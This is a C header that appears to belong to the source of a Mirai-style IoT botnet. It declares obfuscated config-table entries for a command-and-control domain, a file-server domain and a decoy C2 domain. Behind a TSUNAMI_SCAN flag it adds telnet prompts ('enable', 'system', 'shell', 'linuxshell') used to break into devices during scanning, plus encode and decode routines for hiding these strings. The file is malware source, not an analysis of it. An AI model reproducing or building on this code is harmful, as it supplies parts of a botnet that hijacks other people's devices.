#pragma once

#include <stdint.h>

#include "includes.h"
#include "scan.h"

enum
{
	ENTRY_CNC_DOMAIN = 0,
	ENTRY_FILE_SERVER_DOMAIN = 1,
	ENTRY_SUCCESS_STRING = 2,
	ENTRY_YOUTUBE_LINK = 3,
	ENTRY_FAKE_CNC_DOMAIN = 4,
	#ifdef TSUNAMI_SCAN
	ENTRY_TELNET_QUERY = 5,
	ENTRY_TELNET_ENABLE = 6,
	ENTRY_TELNET_SYSTEM = 7,
	ENTRY_TELNET_SHELL = 8,
	ENTRY_TELNET_SH = 9,
	ENTRY_TELNET_LINUXSHELL = 10,
	#endif
};

struct entry
{
	uint8_t id;
	char *val;
	uint8_t data_len;
	char buf[DNS_TXT_MAX_SIZE];
	BOOL d;
	struct entry *next;
};

void init_entrys(void);
struct entry *retrieve_entry(uint8_t);
void decode(char *, char *, uint8_t);
void encode(char *, char *, uint8_t);
